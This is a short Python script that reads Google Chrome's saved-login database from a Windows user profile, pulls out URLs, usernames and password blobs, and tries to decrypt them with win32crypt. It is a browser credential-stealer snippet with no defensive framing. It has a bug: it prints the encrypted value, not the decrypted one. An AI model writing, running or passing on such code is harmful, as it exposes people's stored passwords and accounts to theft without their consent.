import sqlite3,os,win32crypt

userdir=os.path.expanduser("~")
chromepath=os.path.join(userdir,"AppData","Local","Google","Chrome","User Data","Default","Login Data")

conn=sqlite3.connect(chromepath)
c=conn.cursor()
c.execute("SELECT origin_url, username_value, password_value FROM logins;")

login_data=c.fetchall()

for url,username,password in login_data:
    print(password)
    pwd=win32crypt.CryptUnprotectData(password)
    print("%s,%s,%s"%(url,username,password))
        